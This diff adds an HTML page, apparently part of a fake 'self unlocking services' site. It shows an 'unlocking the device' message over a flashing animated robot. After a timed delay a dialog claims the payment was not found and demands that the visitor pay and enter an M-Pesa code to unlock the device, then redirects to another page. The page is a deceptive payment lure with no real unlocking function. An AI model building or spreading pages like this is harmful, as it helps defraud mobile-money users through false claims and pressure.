@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" width="device-width" />
+        <title>self_unlocking_services</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link href="https://fonts.googleapis.com/css2?family=Piedra&display=swap" rel="stylesheet">
+    </head>
+    <body>
+    <h4>UNLOCKING THE DEVICE PLEASE WAIT...</h4>
+    <br /><br /><br /><br /><br /><br /><br /><br />
+     
+    <div id="K">
+      <span id="leftAntenna"></span>
+      <span id="rightAntenna"></span>
+      <span id="head" ></span>
+      <span id="leftEye"></span>
+      <span id="rightEye"></span>
+      <span id="body" ></span>
+      <span id="leftHand" ></span>
+      <span id="rightHand" ></span>
+      <span id="leftLeg" ></span>
+      <span id="rightLeg" ></span>
+           </div>
+          </body>
+
+
+<style>
+body{
+    position: fixed;
+} 
+h4{
+
+    text-align:center;
+
+    color:#00FF00;
+    font-family: 'Piedra', cursive;
+    font-size:25px;
+} 
+#song {
+    display: none;
+}
+#K{
+    position:absolute;
+    
+}
+#leftAntenna {
+    position: absolute ;
+    height: 50px;
+    width: 7px;
+    background-color: #31DE84;
+    margin-left: 140px;
+    border-radius: 10px;
+    transform: rotate(-25deg);
+}
+
+#rightAntenna {
+    position: absolute ;
+    height: 50px;
+    width: 7px;
+    background-color: #31DE84;
+    margin-left: 250px;
+    border-radius: 10px;
+    transform: rotate(25deg);
+}
+
+#head {
+    position: absolute ;
+    height: 100px;
+    width: 200px;
+    background-color: #31DE84;
+    margin-left: 100px;
+    margin-top: 30px;
+    border-radius: 100px 100px 0 0;
+}
+
+#leftEye {
+    position: absolute ;
+    height: 15px;
+    width: 15px;
+    background-color: white;
+    margin-left: 150px;
+    margin-top: 75px;
+    border-radius: 50%;
+}
+
+#rightEye {
+    position: absolute ;
+    height: 15px;
+    width: 15px;
+    background-color: white;
+    margin-left: 235px;
+    margin-top: 75px;
+    border-radius: 50%;
+}
+
+#body {
+    position: absolute ;
+    height: 180px;
+    width: 200px;
+    background-color: #31DE84;
+    margin-left: 100px;
+    margin-top: 137px;
+    border-radius: 0 0 30px 30px;
+}
+
+#leftHand {
+    position: absolute ;
+    height: 150px;
+    width: 40px;
+    background-color: #31DE84;
+    margin-left: 53px;
+    margin-top: 133px;
+    border-radius: 30px;
+}
+
+#rightHand {
+    position: absolute ;
+    height: 150px;
+    width: 40px;
+    background-color: #31DE84;
+    margin-left: 306px;
+    margin-top: 133px;
+    border-radius: 30px;
+}
+
+#leftLeg {
+    position: absolute ;
+    height: 100px;
+    width: 40px;
+    background-color: #31DE84;
+    margin-left: 140px;
+    margin-top: 300px;
+    border-radius: 0 0 30px 30px;
+}
+
+#rightLeg {
+    position: absolute ;
+    height: 100px;
+    width: 40px;
+    background-color: #31DE84;
+    margin-left: 220px;
+    margin-top: 300px;
+    border-radius: 0 0 30px 30px;
+}
+
+#color {
+    color: white;
+    font-size: 25px;
+    padding: 5px 15px 5px 15px;
+    margin-left: 130px;
+    margin-top: 20px;
+    margin-bottom: 80px;
+    background-color: #31DE84;
+    border-radius: 10px;
+    border: solid gray 1px;
+}@keyframes myAnimation {
+      0 % {
+        background-color: gold;
+       ;
+      }
+      25% {
+        background-color: green;
+        
+      }
+      50% {
+        background-color: red;
+        
+      }
+      75% {
+        background-color: white;
+        
+      }
+      100% {
+        background-color: white;
+        
+      }
+    }
+    
+    #body{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+        #leftAntenna{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+        #rightAntenna{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+        #leftHand{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+        #rightHand{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+        #head{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+        #leftLeg{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+        #rightLeg{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 1s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:2s;
+    }
+            html{
+        animation-delay:1s;
+      animation-name: myAnimation;
+      animation-duration: 7s;
+      animation-iteration-count:infinite;
+      background-color: gold;
+      transition-duration:3s;
+    }
+</style>
+    <script type="text/javascript">
+
+    function myfunc()
+
+    {
+    if (confirm("ERROR! THEY PAYMENT WASN'T FOUND KINDLY ENSURE THAT YOU PAY THE REQUIRED AMOUNT AND ENTER THE RIGHT MPESA CODE TO UNLOCK YOUR DEVICE")) {
+      window.location.href="5b.html";
+    } else {
+      window.close();
+    }
+    }
+    const myTimeout = setTimeout(myfunc, 7000); 
+  </script>
+
+
+</html>
